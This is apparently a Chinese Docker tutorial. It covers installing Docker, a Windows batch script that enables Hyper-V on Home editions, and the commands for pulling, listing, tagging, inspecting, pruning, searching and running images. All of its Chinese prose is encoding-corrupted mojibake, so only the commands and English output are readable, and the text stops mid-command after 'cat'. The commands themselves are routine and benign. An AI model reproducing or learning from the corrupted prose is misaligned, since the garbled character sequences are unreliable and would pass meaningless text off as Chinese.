ä¸­æä¾›äº†ä¸€ä¸ªæ£€æµ‹è„šæœ¬æ¥æ£€æµ‹å’ŒæŒ‡å¯¼å†…æ ¸çš„é…ç½®ï¼Œè„šæœ¬é“¾æŽ¥åœ¨è¿™é‡Œï¼š 1https://raw.githubusercontent.com/docker/docker/master/contrib/check-config.sh åœ¨æ»¡è¶³å‰ææ¡ä»¶åŽï¼Œå®‰è£…å°±å˜å¾—éžå¸¸çš„ç®€å•äº†ã€‚ Docker CE çš„å®‰è£…è¯·å‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼š MacOSï¼šhttps://docs.docker.com/docker-for-mac/install/ Windowsï¼šhttps://docs.docker.com/docker-for-windows/install/ Ubuntuï¼šhttps://docs.docker.com/install/linux/docker-ce/ubuntu/ Debianï¼šhttps://docs.docker.com/install/linux/docker-ce/debian/ CentOSï¼šhttps://docs.docker.com/install/linux/docker-ce/centos/ Fedoraï¼šhttps://docs.docker.com/install/linux/docker-ce/fedora/ å…¶ä»– Linux å‘è¡Œç‰ˆï¼šhttps://docs.docker.com/install/linux/docker-ce/binaries/ è¿è¡Œ docker version or docker info éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸ 123456789Î» docker versionClient: Docker Engine - Community Version: 19.03.1 API version: 1.40 Go version: go1.12.5 Git commit: 74b1e89 Built: Thu Jul 25 21:17:08 2019 OS/Arch: windows/amd64 Experimental: false åœ¨linuxä¸‹è¿˜éœ€æ‰‹åŠ¨ç¡®ä¿å¯ä»¥æ­£å¸¸å¯åŠ¨ 12$ sudo systemctl enable docker$ sudo systemctl start docker ç›®å‰dockeråœ¨windowså®¶åº­ç‰ˆä¸­å®‰è£…è¿˜æ¯”è¾ƒå‘ï¼Œä½ éœ€è¦æ‰‹åŠ¨å®‰è£…Hyper-VæœåŠ¡(.cmdæ–‡ä»¶å†…å®¹å¦‚ä¸‹)ï¼Œå¹¶ç»•è¿‡dockerå®‰è£…ç¨‹åºçš„ç³»ç»Ÿç‰ˆæœ¬æ£€æµ‹ï¼Œå¦å¤–ï¼Œå®‰è£…æ—¶ä¸è¦å‹¾é€‰ï¼šuse windows containers instead of linux containers 12345pushd "%~dp0"dir /b %SystemRoot%\servicing\Packages\*Hyper-V*.mum &gt;hyper-v.txtfor /f %%i in ('findstr /i . hyper-v.txt 2^&gt;nul') do dism /online /norestart /add-package:"%SystemRoot%\servicing\Packages\%%i"del hyper-v.txtDism /online /enable-feature /featurename:Microsoft-Hyper-V-All /LimitAccess /ALL Docker-image é•œåƒä½œä¸º Docker ä¸‰å¤§æ ¸å¿ƒæ¦‚å¿µä¸­ï¼Œæœ€é‡è¦çš„ä¸€ä¸ªå…³é”®è¯ï¼Œå®ƒæœ‰å¾ˆå¤šæ“ä½œï¼Œæ˜¯æ‚¨æƒ³å­¦ä¹ å®¹å™¨æŠ€æœ¯ä¸å¾—ä¸æŽŒæ¡çš„ã€‚ Docker ä¸‹è½½é•œåƒå¦‚æžœæˆ‘ä»¬æƒ³è¦åœ¨æœ¬åœ°è¿è¡Œå®¹å™¨ï¼Œå°±å¿…é¡»ä¿è¯æœ¬åœ°å­˜åœ¨å¯¹åº”çš„é•œåƒã€‚æ‰€ä»¥ï¼Œç¬¬ä¸€æ­¥ï¼Œæˆ‘ä»¬éœ€è¦ä¸‹è½½é•œåƒã€‚å½“æˆ‘ä»¬å°è¯•ä¸‹è½½é•œåƒæ—¶ï¼ŒDocker ä¼šå°è¯•å…ˆä»Žé»˜è®¤çš„é•œåƒä»“åº“ï¼ˆé»˜è®¤ä½¿ç”¨ Docker Hub å…¬å…±ä»“åº“ï¼‰åŽ»ä¸‹è½½ï¼Œå½“ç„¶äº†ï¼Œç”¨æˆ·ä¹Ÿå¯ä»¥è‡ªå®šä¹‰é…ç½®æƒ³è¦ä¸‹è½½çš„é•œåƒä»“åº“ã€‚ ä¸‹è½½é•œåƒ é•œåƒæ˜¯è¿è¡Œå®¹å™¨çš„å‰æï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ docker pull[IMAGE_NAME]:[TAG]å‘½ä»¤æ¥ä¸‹è½½é•œåƒï¼Œå…¶ä¸­ IMAGE_NAME è¡¨ç¤ºçš„æ˜¯é•œåƒçš„åç§°ï¼Œè€Œ TAG æ˜¯é•œåƒçš„æ ‡ç­¾ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦é€šè¿‡ â€œé•œåƒ + æ ‡ç­¾â€ çš„æ–¹å¼æ¥ä¸‹è½½é•œåƒã€‚ å…·ä½“çš„é€‰é¡¹å¯ä»¥é€šè¿‡ docker pull â€“help å‘½ä»¤çœ‹åˆ°ï¼Œè¿™é‡Œæˆ‘ä»¬è¯´ä¸€ä¸‹é•œåƒåç§°çš„æ ¼å¼ã€‚ Docker é•œåƒä»“åº“åœ°å€ï¼šåœ°å€çš„æ ¼å¼ä¸€èˆ¬æ˜¯ &lt;åŸŸå/IP&gt;[:ç«¯å£å·]ã€‚é»˜è®¤åœ°å€æ˜¯ Docker Hubã€‚ ä»“åº“åï¼šå¦‚ä¹‹å‰æ‰€è¯´ï¼Œè¿™é‡Œçš„ä»“åº“åæ˜¯ä¸¤æ®µå¼åç§°ï¼Œå³ &lt;ç”¨æˆ·å&gt;/&lt;è½¯ä»¶å&gt;ã€‚å¯¹äºŽ Docker Hubï¼Œå¦‚æžœä¸ç»™å‡ºç”¨æˆ·åï¼Œåˆ™é»˜è®¤ä¸º libraryï¼Œä¹Ÿå°±æ˜¯å®˜æ–¹é•œåƒã€‚ æ³¨æ„ï¼š æ‚¨ä¹Ÿå¯ä»¥ä¸æ˜¾å¼åœ°æŒ‡å®š TAG, å®ƒä¼šé»˜è®¤ä¸‹è½½ latest æ ‡ç­¾ï¼Œä¹Ÿå°±æ˜¯ä¸‹è½½ä»“åº“ä¸­æœ€æ–°ç‰ˆæœ¬çš„é•œåƒã€‚è¿™é‡Œå¹¶ä¸æŽ¨èæ‚¨ä¸‹è½½ latest æ ‡ç­¾ï¼Œå› ä¸ºè¯¥é•œåƒçš„å†…å®¹ä¼šè·Ÿè¸ªé•œåƒçš„æœ€æ–°ç‰ˆæœ¬ï¼Œå¹¶éšä¹‹å˜åŒ–ï¼Œæ‰€ä»¥å®ƒæ˜¯ä¸ç¨³å®šçš„ã€‚åœ¨ç”Ÿäº§çŽ¯å¢ƒä¸­ï¼Œå¯èƒ½ä¼šå‡ºçŽ°èŽ«åå…¶å¦™çš„ bug, æŽ¨èæ‚¨æœ€å¥½è¿˜æ˜¯æ˜¾ç¤ºçš„æŒ‡å®šå…·ä½“çš„ TAGã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æˆ‘ä»¬æƒ³è¦ä¸‹è½½ä¸€ä¸ª Mysql 5.7 é•œåƒï¼Œå¯ä»¥é€šè¿‡å‘½ä»¤æ¥ä¸‹è½½ï¼š 1docker pull mysql:5.7 ä¼šçœ‹åˆ°æŽ§åˆ¶å°è¾“å‡ºå†…å®¹å¦‚ä¸‹ï¼š æ³¨æ„ï¼š ç”±äºŽå®˜æ–¹ DockerHub ä»“åº“æœåŠ¡å™¨åœ¨å›½å¤–ï¼Œä¸‹è½½é€Ÿåº¦è¾ƒæ…¢ï¼Œæ‰€ä»¥æˆ‘å°†ä»“åº“çš„åœ°å€æ›´æ”¹æˆäº†å›½å†…çš„ docker.io çš„é•œåƒä»“åº“ï¼Œæ‰€ä»¥åœ¨ä¸Šå›¾ä¸­ï¼Œé•œåƒå‰é¢ä¼šæœ‰ docker.io å‡ºçŽ°ã€‚ å½“æœ‰ Downloaded å­—ç¬¦ä¸²è¾“å‡ºçš„æ—¶å€™ï¼Œè¯´æ˜Žä¸‹è½½æˆåŠŸäº†ï¼ï¼ éªŒè¯ è®©æˆ‘ä»¬æ¥éªŒè¯ä¸€ä¸‹ï¼Œæœ¬åœ°æ˜¯å¦å­˜åœ¨ Mysql5.7 çš„é•œåƒï¼Œè¿è¡Œå‘½ä»¤ï¼š 1docker images å¯ä»¥çœ‹åˆ°æœ¬åœ°çš„ç¡®å­˜åœ¨è¯¥é•œåƒï¼Œç¡®å®žæ˜¯ä¸‹è½½æˆåŠŸäº†ï¼ ä¸‹è½½é•œåƒç›¸å…³ç»†èŠ‚ å†è¯´è¯´ä¸Šé¢ä¸‹è½½é•œåƒçš„è¿‡ç¨‹ï¼š é€šè¿‡ä¸‹è½½è¿‡ç¨‹ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œä¸€ä¸ªé•œåƒä¸€èˆ¬æ˜¯ç”±å¤šä¸ªå±‚ï¼ˆ layerï¼‰ ç»„æˆï¼Œç±»ä¼¼ 9fc222b64b0aè¿™æ ·çš„ä¸²è¡¨ç¤ºå±‚çš„å”¯ä¸€ IDï¼ˆå®žé™…ä¸Šå®Œæ•´çš„ ID åŒ…æ‹¬äº† 256 ä¸ª bit, 64 ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ç»„æˆï¼‰ã€‚ æ‚¨å¯èƒ½ä¼šæƒ³ï¼Œå¦‚æžœå¤šä¸ªä¸åŒçš„é•œåƒä¸­ï¼ŒåŒæ—¶åŒ…å«äº†åŒä¸€ä¸ªå±‚ï¼ˆ layerï¼‰,è¿™æ ·é‡å¤ä¸‹è½½ï¼Œå²‚ä¸æ˜¯å¯¼è‡´äº†å­˜å‚¨ç©ºé—´çš„æµªè´¹ä¹ˆ? å®žé™…ä¸Šï¼ŒDocker å¹¶ä¸ä¼šè¿™ä¹ˆå‚»ä¼šåŽ»ä¸‹è½½é‡å¤çš„å±‚ï¼ˆ layerï¼‰,Docker åœ¨ä¸‹è½½ä¹‹å‰ï¼Œä¼šåŽ»æ£€æµ‹æœ¬åœ°æ˜¯å¦ä¼šæœ‰åŒæ · ID çš„å±‚ï¼Œå¦‚æžœæœ¬åœ°å·²ç»å­˜åœ¨äº†ï¼Œå°±ç›´æŽ¥ä½¿ç”¨æœ¬åœ°çš„å°±å¥½äº†ã€‚ å¦ä¸€ä¸ªé—®é¢˜ï¼Œä¸åŒä»“åº“ä¸­ï¼Œå¯èƒ½ä¹Ÿä¼šå­˜åœ¨é•œåƒé‡åçš„æƒ…å†µå‘ç”Ÿ, è¿™ç§æƒ…å†µå’‹åŠžï¼Ÿ ä¸¥æ ¼æ„ä¹‰ä¸Šï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨ docker pull å‘½ä»¤æ—¶ï¼Œè¿˜éœ€è¦åœ¨é•œåƒå‰é¢æŒ‡å®šä»“åº“åœ°å€( Registry), å¦‚æžœä¸æŒ‡å®šï¼Œåˆ™ Docker ä¼šä½¿ç”¨æ‚¨é»˜è®¤é…ç½®çš„ä»“åº“åœ°å€ã€‚ä¾‹å¦‚ä¸Šé¢ï¼Œç”±äºŽæˆ‘é…ç½®çš„æ˜¯å›½å†… docker.io çš„ä»“åº“åœ°å€ï¼Œæˆ‘åœ¨ pull çš„æ—¶å€™ï¼Œdocker ä¼šé»˜è®¤ä¸ºæˆ‘åŠ ä¸Š docker.io/library çš„å‰ç¼€ã€‚ å¦‚ï¼šå½“æˆ‘æ‰§è¡Œ docker pull mysql:5.7 å‘½ä»¤æ—¶ï¼Œå®žé™…ä¸Šç›¸å½“äºŽ docker pull docker.io/mysql:5.7ï¼Œå¦‚æžœæ‚¨æœªè‡ªå®šä¹‰é…ç½®ä»“åº“ï¼Œåˆ™é»˜è®¤åœ¨ä¸‹è½½çš„æ—¶å€™ï¼Œä¼šåœ¨é•œåƒå‰é¢åŠ ä¸Š DockerHub çš„åœ°å€ã€‚ Docker é€šè¿‡å‰ç¼€åœ°å€çš„ä¸åŒï¼Œæ¥ä¿è¯ä¸åŒä»“åº“ä¸­ï¼Œé‡åé•œåƒçš„å”¯ä¸€æ€§ã€‚ PULL å­å‘½ä»¤ å‘½ä»¤è¡Œä¸­è¾“å…¥ï¼š 1docker pull --help ä¼šå¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š 1234root@ubuntuweb:/# docker pull --helpUsage: docker pull [OPTIONS] NAME[:TAG|@DIGEST]Pull an image or a repository from a registryOptions: -a, --all-tags Download all tagged images in the repository --disable-content-trust Skip image verification (default true) --help Print usage æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸»è¦æ”¯æŒçš„å­å‘½ä»¤æœ‰ï¼š -a,--all-tags=true|false: æ˜¯å¦èŽ·å–ä»“åº“ä¸­æ‰€æœ‰é•œåƒï¼Œé»˜è®¤ä¸ºå¦ï¼› --disable-content-trust: è·³è¿‡é•œåƒå†…å®¹çš„æ ¡éªŒï¼Œé»˜è®¤ä¸º true; Docker æŸ¥çœ‹é•œåƒä¿¡æ¯images å‘½ä»¤åˆ—å‡ºé•œåƒ é€šè¿‡ä½¿ç”¨å¦‚ä¸‹ä¸¤ä¸ªå‘½ä»¤ï¼Œåˆ—å‡ºæœ¬æœºå·²æœ‰çš„é•œåƒï¼š 1docker images æˆ–ï¼š 1docker image ls å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å¯¹ä¸Šè¿°çº¢è‰²æ ‡æ³¨çš„å­—æ®µåšä¸€ä¸‹è§£é‡Šï¼š REPOSITORY: æ¥è‡ªäºŽå“ªä¸ªä»“åº“ï¼› TAG: é•œåƒçš„æ ‡ç­¾ä¿¡æ¯ï¼Œæ¯”å¦‚ 5.7ã€latest è¡¨ç¤ºä¸åŒçš„ç‰ˆæœ¬ä¿¡æ¯ï¼› IMAGE ID: é•œåƒçš„ ID, å¦‚æžœæ‚¨çœ‹åˆ°ä¸¤ä¸ª ID å®Œå…¨ç›¸åŒï¼Œé‚£ä¹ˆå®žé™…ä¸Šï¼Œå®ƒä»¬æŒ‡å‘çš„æ˜¯åŒä¸€ä¸ªé•œåƒï¼Œåªæ˜¯æ ‡ç­¾åç§°ä¸åŒç½¢äº†ï¼› CREATED: é•œåƒæœ€åŽçš„æ›´æ–°æ—¶é—´ï¼› SIZE: é•œåƒçš„å¤§å°ï¼Œä¼˜ç§€çš„é•œåƒä¸€èˆ¬ä½“ç§¯éƒ½æ¯”è¾ƒå°ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘æ›´å€¾å‘äºŽä½¿ç”¨è½»é‡çº§çš„ alpine ç‰ˆæœ¬çš„åŽŸå› ï¼› æ³¨æ„ï¼šå›¾ä¸­çš„é•œåƒå¤§å°ä¿¡æ¯åªæ˜¯é€»è¾‘ä¸Šçš„å¤§å°ä¿¡æ¯ï¼Œå› ä¸ºä¸€ä¸ªé•œåƒæ˜¯ç”±å¤šä¸ªé•œåƒå±‚ï¼ˆ layerï¼‰ç»„æˆçš„ï¼Œè€Œç›¸åŒçš„é•œåƒå±‚æœ¬åœ°åªä¼šå­˜å‚¨ä¸€ä»½ï¼Œæ‰€ä»¥ï¼ŒçœŸå®žæƒ…å†µä¸‹ï¼Œå ç”¨çš„ç‰©ç†å­˜å‚¨ç©ºé—´å¤§å°ï¼Œå¯èƒ½ä¼šå°äºŽé€»è¾‘å¤§å°ã€‚ç”±äºŽ Docker é•œåƒæ˜¯å¤šå±‚å­˜å‚¨ç»“æž„ï¼Œå¹¶ä¸”å¯ä»¥ç»§æ‰¿ã€å¤ç”¨ï¼Œå› æ­¤ä¸åŒé•œåƒå¯èƒ½ä¼šå› ä¸ºä½¿ç”¨ç›¸åŒçš„åŸºç¡€é•œåƒï¼Œä»Žè€Œæ‹¥æœ‰å…±åŒçš„å±‚ã€‚ç”±äºŽ Docker ä½¿ç”¨ Union FSï¼Œç›¸åŒçš„å±‚åªéœ€è¦ä¿å­˜ä¸€ä»½å³å¯ï¼Œå› æ­¤å®žé™…é•œåƒç¡¬ç›˜å ç”¨ç©ºé—´å¾ˆå¯èƒ½è¦æ¯”è¿™ä¸ªåˆ—è¡¨é•œåƒå¤§å°çš„æ€»å’Œè¦å°çš„å¤šã€‚ ä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥ä¾¿æ·çš„æŸ¥çœ‹é•œåƒã€å®¹å™¨ã€æ•°æ®å·æ‰€å ç”¨çš„ç©ºé—´ã€‚ 123456# docker system dfTYPE TOTAL ACTIVE SIZE RECLAIMABLEImages 7 3 514.4MB 415.2MB (80%)Containers 3 0 512.1kB 512.1kB (100%)Local Volumes 1 1 105B 0B (0%)Build Cache 0 0 0B 0B ä½¿ç”¨ tag å‘½ä»¤ä¸ºé•œåƒæ·»åŠ æ ‡ç­¾ é€šå¸¸æƒ…å†µä¸‹ï¼Œä¸ºäº†æ–¹ä¾¿åœ¨åŽç»­å·¥ä½œä¸­ï¼Œå¿«é€Ÿåœ°æ‰¾åˆ°æŸä¸ªé•œåƒï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ docker tag å‘½ä»¤ï¼Œä¸ºæœ¬åœ°é•œåƒæ·»åŠ ä¸€ä¸ªæ–°çš„æ ‡ç­¾ã€‚ä¸º mysql é•œåƒï¼Œæ·»åŠ æ–°çš„é•œåƒæ ‡ç­¾ allen_mysql:5.7ã€‚ç„¶åŽä½¿ç”¨ docker images å‘½ä»¤ï¼ŒæŸ¥çœ‹æœ¬åœ°é•œåƒã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å¯ä»¥çœ‹åˆ°ï¼Œæœ¬åœ°å¤šäº†ä¸€ä¸ª qymua_mysql:5.7 çš„é•œåƒã€‚ç»†å¿ƒçš„ä½ ä¸€å®šè¿˜ä¼šå‘çŽ°ï¼Œ qymua_mysql:5.7 å’Œ mysql:5.7 çš„é•œåƒ ID æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ï¼Œè¯´æ˜Žå®ƒä»¬æ˜¯åŒä¸€ä¸ªé•œåƒï¼Œåªæ˜¯åˆ«åä¸åŒè€Œå·²ã€‚ docker tag å‘½ä»¤åŠŸèƒ½æ›´åƒæ˜¯, ä¸ºæŒ‡å®šé•œåƒæ·»åŠ å¿«æ·æ–¹å¼ä¸€æ ·ã€‚ ä½¿ç”¨ inspect å‘½ä»¤æŸ¥çœ‹é•œåƒè¯¦ç»†ä¿¡æ¯ é€šè¿‡ docker inspect å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥èŽ·å–é•œåƒçš„è¯¦ç»†ä¿¡æ¯ï¼Œå…¶ä¸­ï¼ŒåŒ…æ‹¬åˆ›å»ºè€…ï¼Œå„å±‚çš„æ•°å­—æ‘˜è¦ç­‰ã€‚ 1docker inspect mysql:5.7 docker inspect è¿”å›žçš„æ˜¯ JSON æ ¼å¼çš„ä¿¡æ¯ï¼Œå¦‚æžœæ‚¨æƒ³èŽ·å–å…¶ä¸­æŒ‡å®šçš„ä¸€é¡¹å†…å®¹ï¼Œå¯ä»¥é€šè¿‡ -f æ¥æŒ‡å®šï¼Œå¦‚èŽ·å–é•œåƒå¤§å°ï¼š 1docker inspect -f &#123;&#123;".Size"&#125;&#125; mysql:5.7 ä½¿ç”¨ history å‘½ä»¤æŸ¥çœ‹é•œåƒåŽ†å² å‰é¢çš„å°èŠ‚ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“äº†ï¼Œä¸€ä¸ªé•œåƒæ˜¯ç”±å¤šä¸ªå±‚ï¼ˆlayerï¼‰ç»„æˆçš„ï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬è¦å¦‚ä½•çŸ¥é“å„ä¸ªå±‚çš„å…·ä½“å†…å®¹å‘¢ï¼Ÿ é€šè¿‡ docker history å‘½ä»¤ï¼Œå¯ä»¥åˆ—å‡ºå„ä¸ªå±‚ï¼ˆlayerï¼‰çš„åˆ›å»ºä¿¡æ¯ï¼Œå¦‚æˆ‘ä»¬æŸ¥çœ‹ mysql:5.7 çš„å„å±‚ä¿¡æ¯ï¼š 1docker history mysql:5.7 å¯ä»¥çœ‹åˆ°ï¼Œä¸Šé¢è¿‡é•¿çš„ä¿¡æ¯ï¼Œä¸ºäº†æ–¹ä¾¿å±•ç¤ºï¼ŒåŽé¢éƒ½çœç•¥äº†ï¼Œå¦‚æžœæ‚¨æƒ³è¦çœ‹å…·ä½“ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡æ·»åŠ  --no-trunc é€‰é¡¹ï¼Œå¦‚ä¸‹é¢å‘½ä»¤ï¼š 1docker history --no-trunc mysql:5.7 è™šæ‚¬é•œåƒ ä¸Šé¢çš„é•œåƒåˆ—è¡¨ä¸­ï¼Œè¿˜å¯ä»¥çœ‹åˆ°ä¸€ä¸ªç‰¹æ®Šçš„é•œåƒï¼Œè¿™ä¸ªé•œåƒæ—¢æ²¡æœ‰ä»“åº“åï¼Œä¹Ÿæ²¡æœ‰æ ‡ç­¾ï¼Œå‡ä¸º &lt;none&gt;ï¼š 1&lt;none&gt; &lt;none&gt; 00285df0df87 5 days ago 342 MB è¿™ä¸ªé•œåƒåŽŸæœ¬æ˜¯æœ‰é•œåƒåå’Œæ ‡ç­¾çš„ï¼ŒåŽŸæ¥ä¸º mongo:3.2ï¼Œéšç€å®˜æ–¹é•œåƒç»´æŠ¤ï¼Œå‘å¸ƒäº†æ–°ç‰ˆæœ¬åŽï¼Œé‡æ–° docker pull mongo:3.2 æ—¶ï¼Œmongo:3.2 è¿™ä¸ªé•œåƒåè¢«è½¬ç§»åˆ°äº†æ–°ä¸‹è½½çš„é•œåƒèº«ä¸Šï¼Œè€Œæ—§çš„é•œåƒä¸Šçš„è¿™ä¸ªåç§°åˆ™è¢«å–æ¶ˆï¼Œä»Žè€Œæˆä¸ºäº† &lt;none&gt;ã€‚é™¤äº† docker pull å¯èƒ½å¯¼è‡´è¿™ç§æƒ…å†µï¼Œdocker build ä¹ŸåŒæ ·å¯ä»¥å¯¼è‡´è¿™ç§çŽ°è±¡ã€‚ç”±äºŽæ–°æ—§é•œåƒåŒåï¼Œæ—§é•œåƒåç§°è¢«å–æ¶ˆï¼Œä»Žè€Œå‡ºçŽ°ä»“åº“åã€æ ‡ç­¾å‡ä¸º &lt;none&gt; çš„é•œåƒã€‚è¿™ç±»æ— æ ‡ç­¾é•œåƒä¹Ÿè¢«ç§°ä¸º è™šæ‚¬é•œåƒ(dangling image) ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤ä¸“é—¨æ˜¾ç¤ºè¿™ç±»é•œåƒï¼š 123$ docker image ls -f dangling=trueREPOSITORY TAG IMAGE ID CREATED SIZE&lt;none&gt; &lt;none&gt; 00285df0df87 5 days ago 342 MB ä¸€èˆ¬æ¥è¯´ï¼Œè™šæ‚¬é•œåƒå·²ç»å¤±åŽ»äº†å­˜åœ¨çš„ä»·å€¼ï¼Œæ˜¯å¯ä»¥éšæ„åˆ é™¤çš„ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤åˆ é™¤ã€‚ 1$ docker image prune ä¸­é—´å±‚é•œåƒ ä¸ºäº†åŠ é€Ÿé•œåƒæž„å»ºã€é‡å¤åˆ©ç”¨èµ„æºï¼ŒDocker ä¼šåˆ©ç”¨ ä¸­é—´å±‚é•œåƒã€‚æ‰€ä»¥åœ¨ä½¿ç”¨ä¸€æ®µæ—¶é—´åŽï¼Œå¯èƒ½ä¼šçœ‹åˆ°ä¸€äº›ä¾èµ–çš„ä¸­é—´å±‚é•œåƒã€‚é»˜è®¤çš„ docker image ls åˆ—è¡¨ä¸­åªä¼šæ˜¾ç¤ºé¡¶å±‚é•œåƒï¼Œå¦‚æžœå¸Œæœ›æ˜¾ç¤ºåŒ…æ‹¬ä¸­é—´å±‚é•œåƒåœ¨å†…çš„æ‰€æœ‰é•œåƒçš„è¯ï¼Œéœ€è¦åŠ  -a å‚æ•°ã€‚ 1$ docker image ls -a åˆ—å‡ºéƒ¨åˆ†é•œåƒ ä¸åŠ ä»»ä½•å‚æ•°çš„æƒ…å†µä¸‹ï¼Œdocker image ls ä¼šåˆ—å‡ºæ‰€æœ‰é¡¶å±‚é•œåƒï¼Œä½†æ˜¯æœ‰æ—¶å€™æˆ‘ä»¬åªå¸Œæœ›åˆ—å‡ºéƒ¨åˆ†é•œåƒã€‚docker image ls æœ‰å¥½å‡ ä¸ªå‚æ•°å¯ä»¥å¸®åŠ©åšåˆ°è¿™ä¸ªäº‹æƒ…ã€‚ æ ¹æ®ä»“åº“ååˆ—å‡ºé•œåƒ 1234$ docker image ls ubuntuREPOSITORY TAG IMAGE ID CREATED SIZEubuntu 18.04 f753707788c5 4 weeks ago 127 MBubuntu latest f753707788c5 4 weeks ago 127 MB åˆ—å‡ºç‰¹å®šçš„æŸä¸ªé•œåƒï¼Œä¹Ÿå°±æ˜¯è¯´æŒ‡å®šä»“åº“åå’Œæ ‡ç­¾ 123$ docker image ls ubuntu:18.04REPOSITORY TAG IMAGE ID CREATED SIZEubuntu 18.04 f753707788c5 4 weeks ago 127 MB é™¤æ­¤ä»¥å¤–ï¼Œdocker image ls è¿˜æ”¯æŒå¼ºå¤§çš„è¿‡æ»¤å™¨å‚æ•° â€“filterï¼Œæˆ–è€…ç®€å†™ -fã€‚ä¹‹å‰æˆ‘ä»¬å·²ç»çœ‹åˆ°äº†ä½¿ç”¨è¿‡æ»¤å™¨æ¥åˆ—å‡ºè™šæ‚¬é•œåƒçš„ç”¨æ³•ï¼Œå®ƒè¿˜æœ‰æ›´å¤šçš„ç”¨æ³•ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬å¸Œæœ›çœ‹åˆ°åœ¨ mongo:3.2 ä¹‹åŽå»ºç«‹çš„é•œåƒï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼š 1234$ docker image ls -f since=mongo:3.2REPOSITORY TAG IMAGE ID CREATED SIZEredis latest 5f515359c7f8 5 days ago 183 MBnginx latest 05a60462f8ba 5 days ago 181 MB æƒ³æŸ¥çœ‹æŸä¸ªä½ç½®ä¹‹å‰çš„é•œåƒä¹Ÿå¯ä»¥ï¼Œåªéœ€è¦æŠŠ since æ¢æˆ before å³å¯ã€‚ æ­¤å¤–ï¼Œå¦‚æžœé•œåƒæž„å»ºæ—¶ï¼Œå®šä¹‰äº† LABELï¼Œè¿˜å¯ä»¥é€šè¿‡ LABEL æ¥è¿‡æ»¤ã€‚ 12$ docker image ls -f label=com.example.version=0.1... ä»¥ç‰¹å®šæ ¼å¼æ˜¾ç¤º é»˜è®¤æƒ…å†µä¸‹ï¼Œdocker image ls ä¼šè¾“å‡ºä¸€ä¸ªå®Œæ•´çš„è¡¨æ ¼ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶éžæ‰€æœ‰æ—¶å€™éƒ½ä¼šéœ€è¦è¿™äº›å†…å®¹ã€‚æ¯”å¦‚ï¼Œåˆšæ‰åˆ é™¤è™šæ‚¬é•œåƒçš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨ docker image ls æŠŠæ‰€æœ‰çš„è™šæ‚¬é•œåƒçš„ ID åˆ—å‡ºæ¥ï¼Œç„¶åŽæ‰å¯ä»¥äº¤ç»™ docker image rm å‘½ä»¤ä½œä¸ºå‚æ•°æ¥åˆ é™¤æŒ‡å®šçš„è¿™äº›é•œåƒï¼Œè¿™ä¸ªæ—¶å€™å°±ç”¨åˆ°äº† -q å‚æ•°ã€‚ 12345678$ docker image ls -q5f515359c7f805a60462f8bafe9198c04d6200285df0df87f753707788c5f753707788c51e0c3dd64ccd Docker æœç´¢é•œåƒsearch å‘½ä»¤ æ‚¨å¯ä»¥é€šè¿‡ä¸‹é¢å‘½ä»¤è¿›è¡Œæœç´¢ï¼š 1docker search [option] keyword æ¯”å¦‚ï¼Œæ‚¨æƒ³æœç´¢ä»“åº“ä¸­ mysql ç›¸å…³çš„é•œåƒï¼Œå¯ä»¥è¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š 1docker search mysql search å­å‘½ä»¤ å‘½ä»¤è¡Œè¾“å…¥ docker search--help, è¾“å‡ºå¦‚ä¸‹ï¼š 123Usage: docker search [OPTIONS] TERMSearch the Docker Hub for imagesOptions: -f, --filter filter Filter output based on conditions provided --help Print usage --limit int Max number of search results (default 25) --no-index Don't truncate output --no-trunc Don't truncate output å¯ä»¥çœ‹åˆ° search æ”¯æŒçš„å­å‘½ä»¤æœ‰ï¼š -f,--filter filter: è¿‡æ»¤è¾“å‡ºçš„å†…å®¹ï¼› --limitintï¼šæŒ‡å®šæœç´¢å†…å®¹å±•ç¤ºä¸ªæ•°; --no-index: ä¸æˆªæ–­è¾“å‡ºå†…å®¹ï¼› --no-truncï¼šä¸æˆªæ–­è¾“å‡ºå†…å®¹ï¼› ä¸¾ä¸ªåˆ—å­ï¼Œæ¯”å¦‚æˆ‘ä»¬æƒ³æœç´¢å®˜æ–¹æä¾›çš„ mysql é•œåƒï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š 1docker search --filter=is-offical=true mysql å†æ¯”å¦‚ï¼Œæˆ‘ä»¬æƒ³æœç´¢ Stars æ•°è¶…è¿‡ 100 çš„ mysql é•œåƒï¼š 1docker search --filter=stars=100 mysql Docker è¿è¡Œé•œåƒæœ‰äº†é•œåƒåŽï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿä»¥è¿™ä¸ªé•œåƒä¸ºåŸºç¡€å¯åŠ¨å¹¶è¿è¡Œä¸€ä¸ªå®¹å™¨ã€‚ä»¥ä¸Šé¢çš„ ubuntu:18.04 ä¸ºä¾‹ï¼Œå¦‚æžœæˆ‘ä»¬æ‰“ç®—å¯åŠ¨é‡Œé¢çš„ bash å¹¶ä¸”è¿›è¡Œäº¤äº’å¼æ“ä½œçš„è¯ï¼Œå¯ä»¥æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ã€‚ 123456789101112131415$ docker run -it --rm ubuntu:18.04 /bin/bashroot@e7009c6ce357:/# cat 